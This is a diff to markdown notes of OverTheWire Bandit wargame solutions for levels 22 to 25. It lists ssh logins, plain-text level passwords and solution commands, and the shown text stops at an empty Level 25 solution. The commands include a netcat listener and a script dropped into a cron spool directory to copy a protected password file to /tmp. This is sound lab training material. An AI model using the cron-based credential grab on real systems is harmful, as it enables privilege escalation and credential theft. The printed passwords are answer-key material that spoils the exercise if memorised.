@@ -358,4 +358,67 @@ Solution
 - ./suconnect
 - echo '4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA' | nc -nlvp 1234 &
 - ./suconnect 1234
-- password: 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
+- password: bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
+
+## Level 22
+
+Login
+
+- ssh -p 2220 bandit21@bandit.labs.overthewire.org
+- password: bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
+
+Solution
+
+- cat /etc/cron.d/cronjob_bandit22
+- cat /usr/bin/cronjob_bandit22.sh
+- cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+- password: RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+
+## Level 23
+
+Login
+
+- ssh -p 2220 bandit22@bandit.labs.overthewire.org
+- password: RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
+
+Solution
+
+- cat /etc/cron.d/cronjob_bandit23
+- cat /usr/bin/cronjob_bandit23.sh
+- hint: myname=$(whoami)
+- hint: I am user bandit23
+- hint: /tmp/MD5-hash
+- echo I am user bandit23 | md5sum
+- md5-hash -> 8ca319486bfbbc3663ea0fbe81326349
+- cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+- paswword: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+
+## Level 24
+
+Login
+
+- ssh -p 2220 bandit23@bandit.labs.overthewire.org
+- password: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+
+Solution
+
+- cat /etc/cron.d/cronjob_bandit24
+- cat /usr/bin/cronjob_bandit24.sh
+- cd /var/spool/bandit24/foo
+- cat > getpass.sh <<'EOF'
+  - #!/bin/bash
+  - cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+  - EOF
+- chmod +x getpass.sh
+- cat /tmp/bandit24_pass
+- password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+## Level 25
+
+Login
+
+- ssh -p 2220 bandit24@bandit.labs.overthewire.org
+- password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+Solution
+-
